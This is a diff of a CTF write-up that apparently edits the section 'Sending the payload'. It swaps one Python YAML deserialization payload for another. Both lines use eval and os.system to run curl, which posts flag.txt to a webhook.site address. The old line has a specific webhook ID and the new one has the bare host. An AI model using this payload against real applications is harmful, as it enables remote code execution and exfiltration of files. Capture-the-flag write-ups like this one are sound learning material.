@@ -1,6 +1,6 @@
 ---
 created: 2021-12-21T23:50
-updated: 2024-06-10T23:38
+updated: 2024-06-21T21:29
 ---
 
 ## Espace 0
@@ -53,7 +53,7 @@ Apparently it was a zero day vulunrability used in a CTF, what a chad move. We c
 
 ### Sending the payload
 
-`!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__("os").system("curl -X POST --data-binary @flag.txt https://webhook.site/40a3fae4-f378-4100-837c-8f94953fbbc9")' ]]]`
+`!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '__import__("os").system("curl -X POST --data-binary @flag.txt https://webhook.site")' ]]]`
 
 ![](https://raw.githubusercontent.com/octo-kumo/images/master/image-20211221164628024.png)
 
